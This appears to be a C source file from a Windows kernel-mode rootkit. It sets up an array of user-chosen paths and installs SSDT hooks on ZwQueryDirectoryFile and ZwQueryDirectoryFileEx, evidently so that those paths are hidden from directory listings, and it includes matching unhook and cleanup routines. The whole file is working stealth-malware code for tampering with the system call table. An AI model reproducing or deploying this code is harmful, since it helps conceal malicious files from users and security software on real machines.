#include "hooks.h"

#define ARRAY_INITIAL_SIZE 5

void InitializeHooks()
{
	InitArray(&hidePathsArr, ARRAY_INITIAL_SIZE); // Initiates the user-input array.

	oldZwQueryDirectoryFile = (ZwQueryDirectoryFilePtr)ssdtHook((long)ZwQueryDirectoryFile, (long)HookZwQueryDirectoryFile); // NtQueryDirectoryFile Hook
	DbgPrintEx(0, 0, "Hooked ZwQueryDirectoryFile!");

	oldZwQueryDirectoryFileEx = (ZwQueryDirectoryFileExPtr)ssdtHook((long)ZwQueryDirectoryFileEx, (long)HookZwQueryDirectoryFileEx); // NtQueryDirectoryFileEx Hook
	DbgPrintEx(0, 0, "Hooked ZwQueryDirectoryFileEx!");
}

void DeinitializeHooks()
{
	ssdtHook((long)ZwQueryDirectoryFile, (long)oldZwQueryDirectoryFile); // NtQueryDirectoryFile Unhook
	DbgPrintEx(0, 0, "Unhooked ZwQueryDirectoryFile!");

	ssdtHook((long)ZwQueryDirectoryFileEx, (long)oldZwQueryDirectoryFileEx); // NtQueryDirectoryFileEx Unhook
	DbgPrintEx(0, 0, "Unhooked ZwQueryDirectoryFileEx!");

	FreeArray(&hidePathsArr); // Free the allocated memory for the user-input array.
}